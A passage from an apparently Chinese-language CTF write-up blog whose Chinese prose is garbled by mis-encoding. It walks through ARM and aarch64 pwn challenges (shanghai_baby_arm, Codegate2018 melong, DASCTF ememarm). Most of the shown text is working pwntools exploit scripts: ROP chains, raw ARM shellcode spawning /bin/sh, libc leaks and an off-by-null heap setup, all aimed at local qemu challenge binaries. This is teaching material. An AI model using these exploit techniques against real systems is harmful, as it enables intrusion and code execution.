class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/aarch64-linux-gnu/&#x27;</span>, <span class="string">&#x27;./shanghai_baby_arm&#x27;</span>])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./shanghai_baby_arm&#x27;</span>)</span><br><span class="line">bss = <span class="number">0x411068</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.aarch64.sh()).ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(elf.plt[<span class="string">&#x27;mprotect&#x27;</span>])   <span class="comment">#0x411068</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Name:&#x27;</span>, shellcode)</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># .text:00000000004008AC loc_4008AC                              ; CODE XREF: init+60â†“j --&gt;csu2</span></span><br><span class="line"><span class="comment"># .text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]</span></span><br><span class="line"><span class="comment"># .text:00000000004008B0                 MOV             X2, X22</span></span><br><span class="line"><span class="comment"># .text:00000000004008B4                 MOV             X1, X23</span></span><br><span class="line"><span class="comment"># .text:00000000004008B8                 MOV             W0, W24</span></span><br><span class="line"><span class="comment"># .text:00000000004008BC                 ADD             X19, X19, #1</span></span><br><span class="line"><span class="comment"># .text:00000000004008C0                 BLR             X3</span></span><br><span class="line"><span class="comment"># .text:00000000004008C4                 CMP             X19, X20</span></span><br><span class="line"><span class="comment"># .text:00000000004008C8                 B.NE            loc_4008AC</span></span><br><span class="line"><span class="comment"># .text:00000000004008CC</span></span><br><span class="line"><span class="comment"># .text:00000000004008CC loc_4008CC                              ; CODE XREF: init+3Câ†‘j   --&gt;csu1</span></span><br><span class="line"><span class="comment"># .text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]</span></span><br><span class="line"><span class="comment"># .text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]</span></span><br><span class="line"><span class="comment"># .text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]</span></span><br><span class="line"><span class="comment"># .text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40</span></span><br><span class="line"><span class="comment"># .text:00000000004008DC                 RET</span></span><br><span class="line"></span><br><span class="line">csu1 = <span class="number">0x00000000004008CC</span></span><br><span class="line">csu2 = <span class="number">0x00000000004008AC</span></span><br><span class="line"><span class="comment">#mprotect(bss_addr, 0x1000, 7)   --&gt; x19=0, x20=1, x21=mprotect_addr, x22=7, x23=0x1000, x24=bss_addr, x29=0xdeadbeef, x30=csu2</span></span><br><span class="line"></span><br><span class="line">payload  = cyclic(<span class="number">72</span>) + p64(csu1)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>) + p64(csu2)  <span class="comment">#x29  x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment">#x19 x20</span></span><br><span class="line">payload += p64(bss+<span class="number">0x100</span>) + p64(<span class="number">7</span>) <span class="comment">#x21  x22</span></span><br><span class="line">payload += p64(<span class="number">0x1000</span>) + p64(<span class="number">0x411000</span>) <span class="comment">#x23  x24 </span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(bss) <span class="comment">#x29  x30-&gt;shellcode</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨ç¬¬äºŒé¢˜çš„æ€è·¯ï¼Œåˆ©ç”¨read(0, &amp;buf, 0x200)å®ç°ä»»æ„åœ°å€å†™ï¼Œç„¶åå¾€bssæ®µé‡Œå†™æ•°æ®ï¼Œä¸è¿‡æ²¡æ„ä¹‰ç½¢äº†</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122029207.png" alt="image-20240712202911121"></p><h1 id="é¢˜ç›®å››ï¼š32ä½-arm-ret2libc"><a href="#é¢˜ç›®å››ï¼š32ä½-arm-ret2libc" class="headerlink" title="é¢˜ç›®å››ï¼š32ä½ arm ret2libc"></a>é¢˜ç›®å››ï¼š32ä½ arm ret2libc<a id="fourth"></a></h1><p>Codegate2018 melong</p><p>ç»™å®šäº†libc</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122034634.png" alt="image-20240712203449585"></p><p>åœ¨write_diaryå‡½æ•°ä¸­ï¼Œnbyteså¤§å°å¯æ§ï¼Œå¯èƒ½å­˜åœ¨æº¢å‡ºï¼Œa2æ˜¯mainå‡½æ•°ä¸­çš„å±€éƒ¨å˜é‡</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122044100.png" alt="image-20240712204410053"></p><p>nbytes&#x3D;*v8ï¼Œv8æ˜¯PTå‡½æ•°çš„è¿”å›å€¼ï¼Œæˆ‘ä»¬éœ€è¦å°½å¯èƒ½æ§åˆ¶v8ä¸ºå¤§æ•°é€ æˆæº¢å‡º</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122045717.png" alt="image-20240712204505676"></p><p>PTå‡½æ•°ï¼Œå‘ç°å­˜åœ¨è¿”å›å€¼sizeå¯æ§ï¼Œæˆ‘ä»¬çš„åˆ©ç”¨ç›®æ ‡å°±æ˜¯å®ƒäº†ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦æ§åˆ¶ptr&#x3D;&#x3D;exc2ï¼Œexc2ä½äºbssæ®µä¸­ï¼Œåˆå§‹åŒ–ä¸º0</p><p>å½“mallocå¤±è´¥æ—¶è¿”å›å€¼ä¸º0</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122047946.png" alt="image-20240712204759900"></p><p>åœ¨è¿™äº›ä¹‹å‰ï¼Œéœ€è¦è¿›å…¥checkç»™v6èµ‹å€¼æ‰èƒ½æ¥ä¸‹æ¥æ“ä½œ</p><p>æ‰€ä»¥æˆ‘ä»¬å…ˆè¿›å…¥case1è®¾ç½®v6&#x3D;!0ï¼Œç„¶åè¿›å…¥case3è¾“å…¥size&#x3D;-1ä»è€Œmallocå¤±è´¥ï¼Œä½¿ptr&#x3D;exc2&#x3D;0ï¼Œsize_tçš„sizeè¢«èµ‹å€¼ä¸ºäº†0xffffffffï¼Œä¹‹åè¿›å…¥case4çš„write_diaryï¼Œé€šè¿‡  LDRB    R3, [R11,#nbytes] ä»R11çš„-5åç§»å¤„åŠ è½½ä¸€å­—èŠ‚åˆ°R3å¯„å­˜å™¨ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:000106D4 write_diary                             ; CODE XREF: main+184â†“p</span><br><span class="line">.text:000106D4</span><br><span class="line">.text:000106D4 buf             = -0x14</span><br><span class="line">.text:000106D4 var_10          = -0x10</span><br><span class="line">.text:000106D4 nbytes          = -5</span><br><span class="line">.text:000106D4</span><br><span class="line">.text:000106D4                 PUSH    &#123;R11,LR&#125;</span><br><span class="line">.text:000106D8                 ADD     R11, SP, #4</span><br><span class="line">.text:000106DC                 SUB     SP, SP, #0x10</span><br><span class="line">.text:000106E0                 STR     R0, [R11,#var_10]</span><br><span class="line">.text:000106E4                 STR     R1, [R11,#buf]</span><br><span class="line">.text:000106E8                 LDR     R3, [R11,#var_10]</span><br><span class="line">.text:000106EC                 LDR     R3, [R3]</span><br><span class="line">.text:000106F0                 STRB    R3, [R11,#nbytes]</span><br><span class="line">.text:000106F4                 LDRB    R3, [R11,#nbytes]</span><br><span class="line">.text:000106F8                 CMP     R3, #0</span><br><span class="line">.text:000106FC                 BEQ     loc_10720</span><br><span class="line">.text:00010700                 LDRB    R3, [R11,#nbytes]</span><br><span class="line">.text:00010704                 MOV     R2, R3          ; nbytes</span><br><span class="line">.text:00010708                 LDR     R1, [R11,#buf]  ; buf</span><br><span class="line">.text:0001070C                 MOV     R0, #0          ; fd</span><br><span class="line">.text:00010710                 BL      read</span><br><span class="line">.text:00010714                 LDR     R1, [R11,#buf]</span><br><span class="line">.text:00010718                 LDR     R0, =format     ; &quot;you wrote %s\n&quot;</span><br><span class="line">.text:0001071C                 BL      printf</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå®ç°read(0, v5, 0xff)ï¼Œv5ä¸ºä¸»å‡½æ•°çš„å±€éƒ¨å˜é‡ï¼Œç¦»æ ˆåº•åªæœ‰0x54å­—èŠ‚é•¿</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407131320268.png" alt="image-20240713132058100"></p><p>å¯ä»¥ç›´æ¥ç”¨æ ˆåœ°å€ä½œä¸ºè¿”å›åœ°å€ï¼Œå°†shellcodeå¸ƒç½®åœ¨æ ˆä¸Šï¼Œæ‰“ret2shellcodeã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chk</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;Your height(meters) : &#x27;</span>, <span class="built_in">str</span>(<span class="number">1.65</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;Your weight(kilograms) : &#x27;</span>, <span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;How long do you want to take personal training?\n&#x27;</span>, <span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    context.arch = <span class="string">&#x27;arm&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;127.0.0.1 12345&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./melong&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># io = initc(pwnfile, IPort, &#x27;qemu-arm -L ./  ./melong&#x27;)</span></span><br><span class="line">    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-arm -L ./ -g 12345 ./melong&#x27;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach((&#x27;127.0.0.1&#x27;, 12345), &#x27;b *0x01117C&#x27;, pwnfile)</span></span><br><span class="line">    dbg(<span class="string">&#x27;b *0x01126C \n b *0x0010710&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    chk()</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    shellcode  = <span class="string">b&quot;\x02\x20\x42\xe0\x1c\x30\x8f\xe2&quot;</span></span><br><span class="line">    shellcode += <span class="string">b&quot;\x04\x30\x8d\xe5\x08\x20\x8d\xe5&quot;</span></span><br><span class="line">    shellcode += <span class="string">b&quot;\x13\x02\xa0\xe1\x07\x20\xc3\xe5&quot;</span></span><br><span class="line">    shellcode += <span class="string">b&quot;\x04\x30\x8f\xe2\x04\x10\x8d\xe2&quot;</span></span><br><span class="line">    shellcode += <span class="string">b&quot;\x01\x20\xc3\xe5\x0b\x0b\x90\xef&quot;</span></span><br><span class="line">    shellcode += <span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">    payload = shellcode.ljust(<span class="number">84</span>, <span class="string">b&#x27;a&#x27;</span>) + p32(<span class="number">0xfffef0d0</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ret2libc æ„é€ putsæ³„éœ²ä¿¡æ¯ï¼Œéœ€è¦åˆ©ç”¨PCæ§åˆ¶putsè°ƒç”¨åçš„ä¸‹ä¸€æ¡æŒ‡ä»¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chk</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;Your height(meters) : &#x27;</span>, <span class="built_in">str</span>(<span class="number">1.65</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;Your weight(kilograms) : &#x27;</span>, <span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;How long do you want to take personal training?\n&#x27;</span>, <span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    context.arch = <span class="string">&#x27;arm&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;127.0.0.1 12345&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./melong&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-arm -L ./  ./melong&#x27;</span>)</span><br><span class="line">    <span class="comment"># io = initc(pwnfile, IPort, &#x27;qemu-arm -L ./ -g 12345 ./melong&#x27;)</span></span><br><span class="line">    <span class="comment"># dbg(&#x27;b *0x01126C \n b *0x0010710&#x27;)</span></span><br><span class="line"></span><br><span class="line">    puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># .text:000110BC                 BL      puts</span></span><br><span class="line"><span class="comment"># .text:000110C0                 NOP</span></span><br><span class="line"><span class="comment"># .text:000110C4                 POP     &#123;R11,PC&#125;</span></span><br><span class="line"><span class="comment"># .text:000110C4 ; End of function check_first</span></span><br><span class="line">    puts= <span class="number">0x000110BC</span></span><br><span class="line"></span><br><span class="line">    pr0 = <span class="number">0x00011bbc</span></span><br><span class="line">    pr3 = <span class="number">0x00010460</span></span><br><span class="line">    pr4 = <span class="number">0x000105e4</span></span><br><span class="line">    pr11= <span class="number">0x00011290</span> </span><br><span class="line"></span><br><span class="line">    chk()</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">    payload = cyclic(<span class="number">84</span>) + p32(pr0) + p32(puts_got) + p32(puts) + p32(<span class="number">0</span>) + p32(main)</span><br><span class="line">    sl(payload)</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">    puts_addr = uu32(r32())</span><br><span class="line">    libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    system    = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh    = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">   </span><br><span class="line">    chk()</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">    payload = cyclic(<span class="number">84</span>) + p32(pr0) + p32(bin_sh) + p32(system)</span><br><span class="line">    sl(payload)</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="é¢˜ç›®äº”ï¼šaarch64æ¶æ„-off-by-null"><a href="#é¢˜ç›®äº”ï¼šaarch64æ¶æ„-off-by-null" class="headerlink" title="é¢˜ç›®äº”ï¼šaarch64æ¶æ„ off by null"></a>é¢˜ç›®äº”ï¼šaarch64æ¶æ„ off by null<a id="obn"></a></h1><p>DASCTF 1æœˆèµ› ememarm</p><p>2.27  aarch64 çš„å †é¢˜ </p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407131516580.png" alt="image-20240713151602487"></p><p>å»äº†ç¬¦å·è¡¨ </p><p>editå‡½æ•°ä¸­å­˜åœ¨off by nullæ¼æ´</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407131528523.png" alt="image-20240713152844453"></p><h2 id="æœ¬åœ°äº¤å‰ç¼–è¯‘"><a href="#æœ¬åœ°äº¤å‰ç¼–è¯‘" class="headerlink" title="æœ¬åœ°äº¤å‰ç¼–è¯‘"></a><strong>æœ¬åœ°äº¤å‰ç¼–è¯‘</strong><a id="loc"></a></h2><p>å¼‚æ¶æ„å¯¹äºå †æ¥è¯´æœ‰äº›ä¸å¤ªå‹å¥½ï¼Œé¢˜ç›®åªç»™äº†ä¸€ä¸ªlibcæ–‡ä»¶ï¼Œå¦‚æœæ˜¯x86ç³»åˆ—ï¼Œèƒ½ç›´æ¥ä»ç½‘ä¸Šä¸‹è½½debæ–‡ä»¶åŠ å‹åˆ°libcåŒçº§çš„.debugæ–‡ä»¶å¤¹ä¸‹ï¼Œè®¾ç½®debug-file-directoryä¸º.debugæ–‡ä»¶å¤¹ï¼Œè°ƒè¯•æ—¶å°±èƒ½è‡ªåŠ¨åŠ è½½ç¬¦å·ã€‚ä½†æ˜¯armæ¶æ„ä¸èƒ½å¦‚æ­¤ï¼Œå‚è€ƒ<a href="https://bbs.kanxue.com/thread-272332.htm#msg_header_h2_1">winmt</a>æœ¬åœ°è‡ªè¡Œç¼–è¯‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf ./glibc-2.27.tar.xz</span><br><span class="line">mkdir aarch64</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">CC=/usr/bin/aarch64-linux-gnu-gcc \</span><br><span class="line">CXX=/usr/bin/aarch64-linux-gnu-g++ \</span><br><span class="line">CFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot; \</span><br><span class="line">CXXFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot; \</span><br><span class="line">../configure \</span><br><span class="line">--prefix=/ctf/work/archs/arm64/2.27/glibc-2.27/aarch64 \</span><br><span class="line">--host=aarch64-linux \</span><br><span class="line">--target=aarch64-linux \</span><br><span class="line">--disable-werror</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨é¢˜ç›®ç›®å½•ä¸‹ï¼šln -s &#x2F;ctf&#x2F;work&#x2F;archs&#x2F;arm64&#x2F;2.27&#x2F;glibc-2.27&#x2F;aarch64&#x2F;lib .&#x2F;</p><p>è°ƒè¯•æ—¶èƒ½åŠ è½½ç¬¦å·ä¿¡æ¯</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407142046659.png" alt="image-20240714204402367"></p><p>å¯æƒœpwngdbé‡Œé¢çš„å‘½ä»¤ä¼šæŠ¥é”™ æˆ–æ˜¯ä¸æ­£ç¡®åæ˜ ï¼Œä»¥åçœ‹çœ‹èƒ½ä¸èƒ½ææè¿™ä¸ªï¼ˆæç€å…ˆï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407142103556.png" alt="image-20240714210328489"></p><p>åˆ›é€ ä¸€ä¸ªfake chunkï¼Œç„¶åä»»æ„å†™æ”¹free_gotä¸ºsystemï¼Œé€€å‡ºæ‰§è¡Œfree(â€˜&#x2F;bin&#x2F;shâ€™)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;you choice: \n&#x27;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add0</span>(<span class="params">cx=<span class="string">b&#x27;a&#x27;</span>, cy=<span class="string">b&#x27;b&#x27;</span>, ori=<span class="number">0</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;cx:\n&#x27;</span>, cx)</span><br><span class="line">    sla(<span class="string">b&#x27;cy:\n&#x27;</span>, cy)</span><br><span class="line">    sla(<span class="string">b&#x27;do you want delete?\n&#x27;</span>, <span class="built_in">str</span>(ori))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx, content=<span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add1</span>(<span class="params">cx=<span class="string">b&#x27;c&#x27;</span>, cy=<span class="string">b&#x27;d&#x27;</span>, ori=<span class="number">0</span></span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;cx:\n&#x27;</span>, cx)</span><br><span class="line">    sla(<span class="string">b&#x27;cy:\n&#x27;</span>, cy)</span><br><span class="line">    sla(<span class="string">b&#x27;do you want delete?\n&#x27;</span>, <span class="built_in">str</span>(ori))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    context.arch = <span class="string">&#x27;aarch64&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;127.0.0.1 12345&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./ememarm&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># io = initc(pwnfile, IPort, &#x27;qemu-aarch64 -L ./ -g 12345 ./ememarm&#x27;)</span></span><br><span class="line">    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-aarch64 -L ./ ./ememarm&#x27;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach((&#x27;127.0.0.1&#x27;, 12345), &#x27;b *_start&#x27;, pwnfile)</span></span><br><span class="line">    <span class="comment"># dbg(&quot;b *0x00400D40 &quot;)</span></span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27;hello every one welcom my note  ~~4268144\n&#x27;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add0(<span class="string">b&#x27;aaaa&#x27;</span>, <span class="string">b&#x27;bbbb&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    add0(<span class="string">b&#x27;cccc&#x27;</span>, <span class="string">b&#x27;dddd&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    add0(<span class="string">b&#x27;eeee&#x27;</span>, <span class="string">b&#x27;ffff&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    add1(<span 